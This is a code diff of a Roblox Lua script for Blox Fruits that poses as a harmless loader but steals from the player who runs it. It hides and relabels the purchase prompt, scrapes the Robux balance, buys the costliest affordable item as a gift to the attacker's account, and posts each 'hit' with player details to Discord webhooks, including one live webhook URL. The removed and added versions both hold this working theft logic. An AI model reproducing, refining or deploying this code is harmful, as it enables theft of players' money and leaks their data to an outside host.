-                        TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
-                            Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset + 4,
-                                            button.Size.Y.Scale, button.Size.Y.Offset + 4)
-                        }):Play()
-
-                        TweenService:Create(outerGlow, TweenInfo.new(0.3), {
-                            ImageTransparency = 0.6,
-                            Size = UDim2.new(1.7, 0, 1.7, 0),
-                            Position = UDim2.new(-0.35, 0, -0.35, 0)
-                        }):Play()
-
-                        TweenService:Create(edgeHighlight, TweenInfo.new(0.3), {
-                            Thickness = 2,
-                            Transparency = 0
-                        }):Play()
-                    end)
-
-                    button.MouseLeave:Connect(function()
-                        if not button or not button.Parent then return end
-
-                        TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
-                            Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset - 4,
-                                            button.Size.Y.Scale, button.Size.Y.Offset - 4)
-                        }):Play()
-
-                        TweenService:Create(outerGlow, TweenInfo.new(0.3), {
-                            ImageTransparency = 0.8,
-                            Size = UDim2.new(1.5, 0, 1.5, 0),
-                            Position = UDim2.new(-0.25, 0, -0.25, 0)
-                        }):Play()
-
-                        TweenService:Create(edgeHighlight, TweenInfo.new(0.3), {
-                            Thickness = 1.5,
-                            Transparency = 0.5
-                        }):Play()
-                    end)
-
-                    button.MouseButton1Down:Connect(function()
-                        if not button or not button.Parent then return end
-
-                        TweenService:Create(button, TweenInfo.new(0.1), {
-                            Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset - 2,
-                                            button.Size.Y.Scale, button.Size.Y.Offset - 2)
-                        }):Play()
-                    end)
-
-                    button.MouseButton1Up:Connect(function()
-                        if not button or not button.Parent then return end
-
-                        TweenService:Create(button, TweenInfo.new(0.1), {
-                            Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset + 2,
-                                            button.Size.Y.Scale, button.Size.Y.Offset + 2)
-                        }):Play()
-                    end)
-                end
+    local footerContent = footer:FindFirstChild("FooterContent")
+    if footerContent then
+        local content = footerContent:FindFirstChild("Content")
+        if content then
+            local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
+            if RemainingBalanceText then
+                 RemainingBalanceText.Visible = false -- Hide original balance text
             end
-
-            local footer = alertContents:WaitForChild("Footer")
-            local buttons = footer:WaitForChild("Buttons")
-            setupButton(buttons:FindFirstChild("1"))
-            setupButton(buttons:FindFirstChild("2"))
         end
+    end
+end
 
-        local processedPrompts = {}
-        local promptCounter = 1
 
-        RunService.RenderStepped:Connect(function()
-            local purchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
-            if purchasePrompt then
-                local container = purchasePrompt:FindFirstChild("ProductPurchaseContainer")
-                if container then
-                    local animator = container:FindFirstChild("Animator")
-                    if animator then
-                        local prompt = animator:FindFirstChild("Prompt")
-                        if prompt and not processedPrompts[prompt] then
-                            processedPrompts[prompt] = true
-                            applyChanges(prompt, promptCounter)
-                            promptCounter = promptCounter + 1
+-- Webhook and Logging Functions
+local function safeSend(webhookUrl, payload)
+    -- Basic check for valid URL format (supports both discord.com and discordapp.com)
+    if webhookUrl and type(webhookUrl) == "string" and
+       (string.find(webhookUrl, "https://discord.com/api/webhooks/") or string.find(webhookUrl, "https://discordapp.com/api/webhooks/")) then
+        -- Use pcall to prevent errors from halting the script if the request fails
+        local success, err = pcall(function()
+             request({ -- Assumes 'request' is provided by the executor environment
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = payload
+            })
+         end)
+         if not success then
+            warn("Webhook request failed:", err)
+         end
+    else
+        -- Optional: Add a warning if the URL is present but invalid format
+        if webhookUrl and webhookUrl ~= "" then
+            warn("Invalid or unsupported webhook URL format:", webhookUrl)
+        end
+    end
+end
+
+local function sendExecutionLog()
+    local executorIdentifier = getExecutor()
+    local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
+    local membershipType = game.Players.LocalPlayer.MembershipType
+    local hasPremium = (membershipType == Enum.MembershipType.Premium) and "Yes" or "No"
+
+    local embed = {
+        ["title"] = "Script Execution Log",
+        ["color"] = 3063792, -- Blue color
+        ["fields"] = {
+             { ["name"] = "Username", ["value"] = game.Players.LocalPlayer.Name, ["inline"] = true },
+             { ["name"] = "Script Version", ["value"] = version, ["inline"] = true },
+             { ["name"] = "Game", ["value"] = gameInfo and gameInfo.Name or "Unknown", ["inline"] = true },
+             { ["name"] = "Premium", ["value"] = hasPremium, ["inline"] = true },
+             { ["name"] = "Executor", ["value"] = executorIdentifier, ["inline"] = true },
+             { ["name"] = "Platform", ["value"] = platform, ["inline"] = true },
+        }
+    }
+    local dataPayload = { ["embeds"] = {embed} }
+    local jsonData = HttpService:JSONEncode(dataPayload)
+
+    print("Sending Execution log...") -- Debug print
+    safeSend(ExecutionWebhook, jsonData)
+    safeSend(AllExecutionsWebhook, jsonData)
+end
+
+local function getRobuxBalance()
+    -- This function is inherently unreliable as it relies on UI scraping.
+    -- Consider alternative methods if possible, or accept its potential inaccuracy.
+    local balance = 0 -- Default to 0
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if PurchasePrompt then
+        local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+        if ProductContainer then
+            local Animator = ProductContainer:FindFirstChild("Animator")
+            if Animator then
+                local Prompt = Animator:FindFirstChild("Prompt") -- Find prompt within animator
+                if Prompt then
+                    local AlertContents = Prompt:FindFirstChild("AlertContents")
+                    if AlertContents then
+                        local Footer = AlertContents:FindFirstChild("Footer")
+                        if Footer then
+                             local FooterContent = Footer:FindFirstChild("FooterContent")
+                             if FooterContent then
+                                 local Content = FooterContent:FindFirstChild("Content")
+                                 if Content then
+                                     local RemainingBalanceText = Content:FindFirstChild("RemainingBalanceText")
+                                     if RemainingBalanceText and RemainingBalanceText:IsA("TextLabel") then
+                                         -- Attempt to extract number using string patterns
+                                         local balanceText = RemainingBalanceText.Text:match("%d+,?%d*") -- Match numbers, potentially with commas
+                                         if balanceText then
+                                            balanceText = balanceText:gsub(",", "") -- Remove commas
+                                            balance = tonumber(balanceText) or 0
+                                            -- The original +25 seems arbitrary, likely tied to the cost of the initial prompt trigger item.
+                                            -- It might be better to return the raw scraped value or handle the offset elsewhere if needed.
+                                            -- For now, retaining original logic:
+                                            balance = balance + 25
+                                         end
+                                     end
+                                 end
+                             end
                         end
                     end
                 end
             end
-        end)
-    end)
-
-    if not success then
-        warn("Failed to access CoreGui: " .. tostring(result))
-    end
-end)
-
---- START OF FILE Bloxfruit_improved.txt ---
-
-Username = "x6TNine"
-Webhook = "https://discordapp.com/api/webhooks/1341656574455976038/1cfpz1y7j2eBj7CTLhdcPPXoH4ltNdK3zYYtftVAtiFMuVnAXKKdH45hAgvVfneS5HC5"
-
--- BLOX FRUIT
-
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local CoreGui = game:GetService("CoreGui")
-local Players = game:GetService("Players")
-local result = 0
-
-local HttpService = game:GetService("HttpService")
-
-local success, UserId = pcall(function()
-    return Players:GetUserIdFromNameAsync(Username)
-end)
-
-local args = {
-    [1] = "buyRobuxShop",
-    [2] = {
-        ["StorageName"] = "2x EXP (15 mins.)",
-        ["FunnelId"] = "Shop",
-        ["PurchaseLocation"] = "Shop"
-    }
-}
-game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
-
-local CoreGui = game:GetService("CoreGui")
-local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
-local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
-local Animator = ProductContainer:WaitForChild("Animator")
-
-Animator.ChildAdded:Connect(function(child)
-    if child.Name == "Prompt" then
-        local prompt = Animator:WaitForChild("Prompt")
-        local alertContents = prompt:WaitForChild("AlertContents")
-
-        local middleContent = alertContents:FindFirstChild("MiddleContent")
-        if middleContent then
-            middleContent.Visible = false
-        end
-
-        local title = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
-        if title and title:IsA("TextLabel") then
-            title.Text = "SCRIPT LOADED!"
-        end
-
-        local footerButtons = alertContents:WaitForChild("Footer"):WaitForChild("Buttons")
-        local button2 = footerButtons:FindFirstChild("2")
-        if button2 then
-            button2.Visible = false
-        end
-
-        local footerContent = alertContents:WaitForChild("Footer"):FindFirstChild("FooterContent")
-        if footerContent then
-            footerContent.Visible = false
-        end
-
-        local button1 = footerButtons:FindFirstChild("1")
-        if button1 then
-            local buttonContent = button1:WaitForChild("ButtonContent")
-            local buttonMiddleContent = buttonContent:WaitForChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
-            if buttonMiddleContent then
-                buttonMiddleContent.Text = "Inject"
-            end
         end
     end
-end)
+    return balance
+end
 
-local function sendWebhook()
+-- << Modified sendWebhook Function >>
+local function sendWebhook(currentTotalSpent, itemName, targetUsername)
+    local balance = getRobuxBalance()
+    local executorIdentifier = getExecutor()
+    local receiverDisplay = (targetUsername == AdminUsername and AdminUsername ~= "") and AdminUsername or Username
 
     local embed = {
-        ["title"] = "You Got Blox Fruit Hit!",
-        ["color"] = 39423,
+        ["title"] = ":shark: ! SHARKED LMAO ! :shark:",
+        ["color"] = 39423, -- Light green color
         ["fields"] = {
-            {
-                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
-                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
-            },
-            {
-                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
-                ["value"] = "```" .. result .. "```"
-            },
-            {
-                ["name"] = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ",
-                ["value"] = "[**Join Invite**](https://discord.gg/darkscripts)",
-            }
+            { ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ", ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. receiverDisplay .. "```" },
+            { ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx", ["value"] = "```" .. currentTotalSpent .. "```" },
+            { ["name"] = "ɪᴛᴇᴍ ʜɪᴛ", ["value"] = "```" .. itemName .. "```" },
+            { ["name"] = "ᴇxᴇᴄᴜᴛᴏʀ ɪɴꜰᴏ", ["value"] = "```Executor: " .. executorIdentifier .. "```" },
+            { ["name"] = "ᴄᴜʀʀᴇɴᴛ ʀᴏʙᴜx", ["value"] = "```" .. balance .. "```" }, -- Balance after potential spend
+            { ["name"] = "Script Version: " .. version, ["value"] = "**" .. version .. "**" }
+        },
+        ["footer"] = { ["text"] = "SharkyScripts" } -- Optional footer
+    }
+    local dataPayload = { ["content"] = "@everyone", ["embeds"] = {embed} } -- Consider removing @everyone if noisy
+    local jsonData = HttpService:JSONEncode(dataPayload)
+
+    -- Send to specific webhook based on target
+    if targetUsername == AdminUsername and AdminUsername ~= "" then
+        print("Sending Admin log...") -- Debug print
+        safeSend(AdminLogsWebhook, jsonData)
+    else
+        print("Sending User log...") -- Debug print
+        safeSend(LogsWebhook, jsonData)
+    end
+
+    -- Always send to the 'AllLogsWebhook'
+    print("Sending All log...") -- Debug print
+    safeSend(AllLogsWebhook, jsonData)
+end
+
+
+-- Purchase Logic Functions
+local function waitForPromptToDisappear()
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    while PurchasePrompt and PurchasePrompt:FindFirstChild("ProductPurchaseContainer") and PurchasePrompt.ProductPurchaseContainer:FindFirstChild("Animator") and PurchasePrompt.ProductPurchaseContainer.Animator:FindFirstChild("Prompt") do
+        task.wait()
+        PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt") -- Re-check prompt existence
+    end
+end
+
+local confirmButtonConnection = nil -- Store connection to disconnect later
+local function waitForPurchaseConfirmation()
+     -- Disconnect previous listener if it exists
+    if confirmButtonConnection then
+        confirmButtonConnection:Disconnect()
+        confirmButtonConnection = nil
+    end
+
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if not PurchasePrompt then return end
+    local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer", 5) -- Add timeout
+    if not ProductContainer then return end
+    local Animator = ProductContainer:WaitForChild("Animator", 5)
+    if not Animator then return end
+    local prompt = Animator:WaitForChild("Prompt", 5)
+    if not prompt then return end
+    local alertContents = prompt:WaitForChild("AlertContents", 5)
+    if not alertContents then return end
+    local footer = alertContents:WaitForChild("Footer", 5)
+    if not footer then return end
+    local footerButtons = footer:WaitForChild("Buttons", 5)
+    if not footerButtons then return end
+    local confirmButton = footerButtons:WaitForChild("2", 5) -- Button "2" is usually confirm
+    if not confirmButton then return end
+
+    -- Connect and store the connection
+    confirmButtonConnection = confirmButton.MouseButton1Click:Connect(function()
+        print("Confirm button clicked!") -- Debug
+        promptConfirmed = true
+         -- Disconnect self after firing once
+        if confirmButtonConnection then
+            confirmButtonConnection:Disconnect()
+            confirmButtonConnection = nil
+        end
+    end)
+end
+
+-- << Modified buyItem Function >>
+local function buyItem(storageName, purchaseLocation, cost, targetUsernameOverride)
+    if purchaseInProgress then
+        warn("Purchase already in progress for:", storageName)
+        return
+    end
+    purchaseInProgress = true
+    print("Attempting to buy:", storageName, "for", cost, "Robux | Target Override:", targetUsernameOverride or "Default")
+
+    local targetUser
+    local targetActualUsername
+    if targetUsernameOverride and targetUsernameOverride == AdminUsername and AdminUserId then
+        targetUser = { name = AdminUsername, id = AdminUserId }
+        targetActualUsername = AdminUsername
+        print("Targeting Admin:", AdminUsername, "(ID:", AdminUserId, ")")
+    else
+        -- Default to the primary Username if override is not admin or not provided/valid, or if Admin details are missing
+        targetUser = { name = Username, id = UserId }
+        targetActualUsername = Username
+         print("Targeting User:", Username, "(ID:", UserId, ")")
+    end
+
+    if not targetUser or not targetUser.id then
+        warn("Could not determine valid target User ID for purchase:", storageName)
+        purchaseInProgress = false
+        return
+    end
+
+    local args = {
+        [1] = "buyRobuxShop",
+        [2] = {
+            ["Message"] = getRandomMessage(),
+            ["StorageName"] = storageName,
+            ["PurchaseLocation"] = purchaseLocation,
+            ["FunnelId"] = "Shop", -- This might be game-specific
+            ["ReceiverName"] = targetUser.name,
+            ["ReceiverUserId"] = targetUser.id
         }
     }
 
-    local data = HttpService:JSONEncode({
-        ["content"] = "@everyone",
-        ["embeds"] = {embed}
-    })
+    local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
+    if not CommF or not CommF:IsA("RemoteFunction") then
+         warn("Could not find required RemoteFunction 'CommF_'")
+         purchaseInProgress = false
+         return
+    end
 
-    request({
-        Url = Webhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = data
-    })
-
-    request({
-        Url = LogsWebhook, -- Assuming LogsWebhook is defined elsewhere
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = data
-    })
-end
-
-local function stealitem()
-    local items_to_steal = {
-        { threshold = 5000, storage_name = "Permanent Dragon-Dragon" },
-        { threshold = 4000, storage_name = "Permanent Kitsune-Kitsune" },
-        { threshold = 3000, storage_name = "Permanent Leopard-Leopard" },
-        { threshold = 2700, storage_name = "Fruit Notifier" },
-        { threshold = 2550, storage_name = "Permanent Spirit-Spirit" },
-        { threshold = 2500, storage_name = "Permanent Gas-Gas" },
-        { threshold = 2450, storage_name = "Permanent Venom-Venom" },
-        { threshold = 2425, storage_name = "Permanent Shadow-Shadow" },
-        { threshold = 2400, storage_name = "Permanent Dough-Dough" },
-        { threshold = 2350, storage_name = "Permanent T-Rex-T-Rex" },
-        { threshold = 2300, storage_name = "Permanent Gravity-Gravity" },
-        { threshold = 2250, storage_name = "Permanent Blizzard-Blizzard" },
-        { threshold = 2200, storage_name = "Permanent Pain-Pain" },
-        { threshold = 2100, storage_name = "Permanent Rumble-Rumble" },
-        { threshold = 2000, storage_name = "Permanent Portal-Portal" },
-        { threshold = 1900, storage_name = "Permanent Sound-Sound" },
-        { threshold = 1800, storage_name = "Permanent Spider-Spider" },
-        { threshold = 1700, storage_name = "Permanent Love-Love" },
-        { threshold = 1650, storage_name = "Permanent Buddha-Buddha" },
-        { threshold = 1500, storage_name = "Permanent Quake-Quake" },
-        { threshold = 1300, storage_name = "Permanent Magma-Magma" },
-        { threshold = 1275, storage_name = "Permanent Ghost-Ghost" },
-        { threshold = 1250, storage_name = "Permanent Barrier-Barrier" },
-        { threshold = 1200, storage_name = "Dark Blade" },
-        { threshold = 1100, storage_name = "Permanent Light-Light" },
-        { threshold = 1000, storage_name = "Permanent Diamond-Diamond" },
-        { threshold = 950, storage_name = "Permanent Dark-Dark" },
-        { threshold = 850, storage_name = "Permanent Sand-Sand" },
-        { threshold = 750, storage_name = "Permanent Ice-Ice" },
-        { threshold = 650, storage_name = "Permanent Falcon-Falcon" },
-        { threshold = 550, storage_name = "Permanent Flame-Flame" },
-        { threshold = 450, storage_name = "2x Money" },
-        { threshold = 400, storage_name = "+1 Fruit Storage" },
-        { threshold = 380, storage_name = "Permanent Spike-Spike" },
-        { threshold = 350, storage_name = "2x Boss Drops" },
-        { threshold = 250, storage_name = "Permanent Smoke-Smoke" },
-        { threshold = 220, storage_name = "Permanent Bomb-Bomb" },
-        { threshold = 180, storage_name = "Permanent Spring-Spring" },
-        { threshold = 100, storage_name = "Permanent Blade-Blade" },
-        { threshold = 75, storage_name = "Permanent Spin-Spin" },
-        { threshold = 50, storage_name = "10K Money" },
-        { threshold = 25, storage_name = "2x EXP (15 mins.)" },
-    }
-
-    table.sort(items_to_steal, function(a, b)
-        return a.threshold > b.threshold
+    local successCall, result = pcall(function()
+        return CommF:InvokeServer(unpack(args))
     end)
 
-    for _, item_data in ipairs(items_to_steal) do
-        if result >= item_data.threshold then
-            local args = {
-                [1] = "buyRobuxShop",
-                [2] = {
-                    ["Message"] = "Ishus On top",
-                    ["StorageName"] = item_data.storage_name,
-                    ["PurchaseLocation"] = (string.find(item_data.storage_name, "Permanent") and "FruitShop") or "Shop",
-                    ["FunnelId"] = "Shop",
-                    ["ReceiverName"] = Username,
-                    ["ReceiverUserId"] = UserId,
-                }
-            }
-            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
-            break -- Exit the loop after gifting the first eligible item
+    task.wait(0.5) -- Short delay after invoke
+
+    if successCall then
+        print("InvokeServer succeeded for", storageName, ". Result:", result) -- Log result if any
+        totalSpent = totalSpent + cost
+        -- Pass the actual username used for the purchase to the webhook
+        sendWebhook(totalSpent, storageName, targetActualUsername)
+    else
+       warn("InvokeServer pcall failed for item:", storageName, "| Error:", result) -- Log the error message
+    end
+
+    waitForPromptToDisappear() -- Wait for UI to clear after the attempt
+    task.wait(0.5) -- Extra delay before allowing next purchase
+    purchaseInProgress = false
+    print("Purchase attempt finished for:", storageName)
+end
+
+-- << Modified stealItem Function - NEEDS USER CONFIGURATION >>
+local function stealItem(balance)
+    print("Checking balance for stealing:", balance)
+    -- =========================================================================--
+    -- IMPORTANT: You MUST configure the TARGET for EACH item below.             --
+    -- Replace 'Username' or 'AdminUsername' as the 4th argument for buyItem.    --
+    -- The script will attempt to buy the MOST EXPENSIVE item first based on     --
+    -- the estimated balance.                                                   --
+    -- =========================================================================--
+
+    if balance >= 5000 then
+         buyItem("Permanent Dragon-Dragon", "FruitShop", 5000, Username) -- CONFIG: Set target (AdminUsername or Username)
+    elseif balance >= 4000 then
+        buyItem("Permanent Kitsune-Kitsune", "FruitShop", 4000, Username) -- CONFIG: Set target
+    elseif balance >= 3000 then
+        buyItem("Permanent Yeti-Yeti", "FruitShop", 3000, Username) -- CONFIG: Set target
+    elseif balance >= 2700 then
+        buyItem("Fruit Notifier", "Shop", 2700, Username) -- CONFIG: Set target
+    elseif balance >= 2550 then
+        buyItem("Permanent Spirit-Spirit", "FruitShop", 2550, Username) -- CONFIG: Set target
+    elseif balance >= 2500 then
+        buyItem("Permanent Gas-Gas", "FruitShop", 2500, Username) -- CONFIG: Set target
+    elseif balance >= 2450 then
+        buyItem("Permanent Venom-Venom", "FruitShop", 2450, Username) -- CONFIG: Set target
+    elseif balance >= 2425 then
+        buyItem("Permanent Shadow-Shadow", "FruitShop", 2425, Username) -- CONFIG: Set target
+    elseif balance >= 2400 then
+        buyItem("Permanent Dough-Dough", "FruitShop", 2400, Username) -- CONFIG: Set target
+    elseif balance >= 2350 then
+        buyItem("Permanent T-Rex-T-Rex", "FruitShop", 2350, Username) -- CONFIG: Set target
+    elseif balance >= 2250 then
+        buyItem("Permanent Blizzard-Blizzard", "FruitShop", 2250, Username) -- CONFIG: Set target
+    elseif balance >= 2200 then
+        buyItem("Permanent Pain-Pain", "FruitShop", 2200, Username) -- CONFIG: Set target
+    elseif balance >= 2100 then
+        buyItem("Permanent Rumble-Rumble", "FruitShop", 2100, Username) -- CONFIG: Set target
+    elseif balance >= 2000 then
+        buyItem("Permanent Portal-Portal", "FruitShop", 2000, Username) -- CONFIG: Set target
+    elseif balance >= 1900 then
+        buyItem("Permanent Sound-Sound", "FruitShop", 1900, Username) -- CONFIG: Set target
+    elseif balance >= 1800 then
+        buyItem("Permanent Spider-Spider", "FruitShop", 1800, Username) -- CONFIG: Set target
+    elseif balance >= 1700 then
+        buyItem("Permanent Love-Love", "FruitShop", 1700, Username) -- CONFIG: Set target
+    elseif balance >= 1650 then
+        buyItem("Permanent Buddha-Buddha", "FruitShop", 1650, Username) -- CONFIG: Set target
+    elseif balance >= 1500 then
+        buyItem("3x Mythical Scrolls", "Shop", 1500, Username) -- CONFIG: Set target (Assuming 'Shop' is correct location)
+    elseif balance >= 1300 then
+        buyItem("Permanent Magma-Magma", "FruitShop", 1300, Username) -- CONFIG: Set target
+    elseif balance >= 1275 then
+        buyItem("Permanent Ghost-Ghost", "FruitShop", 1275, Username) -- CONFIG: Set target
+    elseif balance >= 1200 then
+        buyItem("Dark Blade", "Shop", 1200, Username) -- CONFIG: Set target
+    elseif balance >= 1100 then
+        buyItem("Permanent Light-Light", "FruitShop", 1100, Username) -- CONFIG: Set target
+    elseif balance >= 1000 then
+        buyItem("Permanent Diamond-Diamond", "FruitShop", 1000, Username) -- CONFIG: Set target
+    elseif balance >= 950 then
+        buyItem("Permanent Dark-Dark", "FruitShop", 950, Username) -- CONFIG: Set target
+    elseif balance >= 850 then
+        buyItem("Permanent Sand-Sand", "FruitShop", 850, Username) -- CONFIG: Set target
+    elseif balance >= 750 then
+        buyItem("Permanent Ice-Ice", "FruitShop", 750, Username) -- CONFIG: Set target
+    elseif balance >= 550 then
+        buyItem("Permanent Flame-Flame", "FruitShop", 550, Username) -- CONFIG: Set target
+    elseif balance >= 460 then -- Original script used 450 cost but checked >= 460 balance, check item price
+        buyItem("2x Mastery", "Shop", 450, Username) -- CONFIG: Set target (Adjust cost if needed)
+    elseif balance >= 450 then
+        buyItem("2x Money", "Shop", 450, Username) -- CONFIG: Set target
+    elseif balance >= 400 then
+        buyItem("+1 Fruit Storage", "Shop", 400, Username) -- CONFIG: Set target
+    elseif balance >= 380 then
+        buyItem("Permanent Spike-Spike", "FruitShop", 380, Username) -- CONFIG: Set target
+    elseif balance >= 350 then
+        buyItem("2x Boss Drops", "Shop", 350, Username) -- CONFIG: Set target
+    elseif balance >= 250 then
+        buyItem("Permanent Smoke-Smoke", "FruitShop", 250, Username) -- CONFIG: Set target
+    elseif balance >= 220 then
+        buyItem("Permanent Bomb-Bomb", "FruitShop", 220, Username) -- CONFIG: Set target
+    elseif balance >= 180 then
+        buyItem("Permanent Spring-Spring", "FruitShop", 180, Username) -- CONFIG: Set target
+    elseif balance >= 100 then
+        buyItem("Permanent Blade-Blade", "FruitShop", 100, Username) -- CONFIG: Set target
+    elseif balance >= 75 then
+        buyItem("Permanent Spin-Spin", "FruitShop", 75, Username) -- CONFIG: Set target
+    elseif balance >= 50 then
+        buyItem("Permanent Rocket-Rocket", "FruitShop", 50, Username) -- CONFIG: Set target
+    elseif balance >= 25 then
+        buyItem("2x EXP (15 mins.)", "Shop", 25, Username) -- CONFIG: Set target (Maybe remove if only used for trigger?)
+    else
+        print("Balance too low for any configured items.")
+    end
+    return
+end
+
+
+-- Main Execution Flow Functions
+local function getRobuxAndProceed()
+    -- This function attempts the main logic of triggering prompt, reading balance, and stealing.
+    coroutine.wrap(function()
+        local sinkLoop = coroutine.create(loopSinkTransparency) -- Create coroutine
+        coroutine.resume(sinkLoop) -- Start it
+
+        -- Trigger initial prompt (use a cheap item)
+        local triggerItem = "2x EXP (15 mins.)"
+        local triggerArgs = {
+            [1] = "buyRobuxShop",
+            [2] = { ["StorageName"] = triggerItem, ["FunnelId"] = "Shop", ["PurchaseLocation"] = "Shop" }
+        }
+        local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
+        if CommF and CommF:IsA("RemoteFunction") then
+             -- Invoke to trigger prompt, ignore result/errors here as we just need the UI
+            pcall(CommF.InvokeServer, CommF, unpack(triggerArgs))
+            print("Initial prompt trigger invoked for:", triggerItem)
+        else
+            warn("Could not find CommF_ to trigger initial prompt.")
+            -- Consider stopping if prompt cannot be triggered
+            coroutine.close(sinkLoop) -- Clean up coroutine
+            return
         end
+
+        -- Wait for purchase prompt to appear
+        local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt", 10) -- Wait up to 10 seconds
+        if not PurchasePrompt then
+            warn("PurchasePrompt did not appear after trigger.")
+             coroutine.close(sinkLoop) -- Clean up coroutine
+            return
+        end
+        print("PurchasePrompt detected.")
+
+        -- Background check for Robux Upsell (indicates insufficient funds initially)
+        local upsellCheck = coroutine.create(function()
+            while task.wait(0.2) do
+                local RobuxUpsellContainer = PurchasePrompt and PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
+                if RobuxUpsellContainer and RobuxUpsellContainer.Visible then
+                    warn("RobuxUpsellContainer detected. Kicking player.")
+                    game.Players.LocalPlayer:Kick("\n[INSUFFICIENT FUNDS OR ALT DETECTED]\nScript Failed!\nCheck the following:\n1) Ensure sufficient Robux.\n2) Use main account, not alt.\n3) Try a different Executor.")
+                    break -- Stop this check coroutine
+                 end
+                 -- If PurchasePrompt disappears, stop checking
+                 if not CoreGui:FindFirstChild("PurchasePrompt") then break end
+            end
+        end)
+        coroutine.resume(upsellCheck)
+
+        -- Wait for the main purchase container and animator
+        local ProductPurchaseContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer", 5)
+        if ProductPurchaseContainer then
+            local Animator = ProductPurchaseContainer:WaitForChild("Animator", 5)
+            if Animator then
+                local Prompt = Animator:WaitForChild("Prompt", 5)
+                if Prompt then
+                    print("Main purchase prompt UI found.")
+                    Prompt.Visible = false -- Hide the prompt window immediately
+
+                    -- Try hiding clipping shield (may not exist or be necessary)
+                    local settingsClippingShield = CoreGui:FindFirstChild("RobloxGui") and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
+                    if settingsClippingShield then settingsClippingShield.Visible = false end
+
+                    task.wait(1) -- Wait for UI to potentially settle after hiding
+
+                    local balance = getRobuxBalance()
+                    print("Estimated Robux balance:", balance)
+
+                    if balance < 25 then
+                         warn("Estimated balance less than 25. Kicking player.")
+                         game.Players.LocalPlayer:Kick("\n[INSUFFICIENT FUNDS OR ALT DETECTED]\nScript Failed!\nCheck the following:\n1) Ensure Robux >= 25.\n2) Use main account, not alt.\n3) Try a different Executor.")
+                         -- Clean up coroutines before returning
+                         coroutine.close(sinkLoop)
+                         coroutine.close(upsellCheck)
+                         return
+                    end
+
+                    -- Dismiss the prompt using Escape simulation
+                    print("Simulating Escape key presses to dismiss prompt...")
+                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
+                    task.wait(0.1)
+                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Escape, false, game) -- Key up
+                     task.wait(0.2)
+                     VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
+                    task.wait(0.1)
+                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Escape, false, game) -- Key up
+
+                    waitForPromptToDisappear() -- Wait for prompt UI to actually go away
+                    print("Prompt dismissed.")
+                    task.wait(0.5) -- Pause before attempting to steal
+
+                    stealItem(balance) -- Initiate the configured item purchase attempts
+
+                else warn("err1: Could not find Prompt element.") end
+            else warn("err2: Could not find Animator element.") end
+        else warn("err3: Could not find ProductPurchaseContainer element.") end
+
+         -- Clean up background coroutines
+        coroutine.close(sinkLoop)
+        coroutine.close(upsellCheck)
+        print("getRobuxAndProceed finished.")
+    end)()
+end
+
+local function waitForPrompt()
+    -- This function modifies the FIRST prompt encountered and handles the confirmation logic.
+    print("Setting up initial prompt modification...")
+    local initialPromptSetup = false
+    local promptConnection = nil -- Connection for ChildAdded
+
+    local function setupPromptInteraction(promptInstance)
+        if not promptInstance then return end
+        print("Modifying UI for prompt:", promptInstance:GetFullName())
+        modifyPromptUI(not initialPromptSetup) -- Pass true only the first time
+        waitForPurchaseConfirmation() -- Setup the click listener
+        initialPromptSetup = true
     end
-end
 
-local function WaitForPrompt1()
-    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
-    repeat task.wait() until not Animator:FindFirstChild("Prompt")
-    stealitem()
-    local CoreGui = game:GetService("CoreGui")
-
-    local success, err = pcall(function()
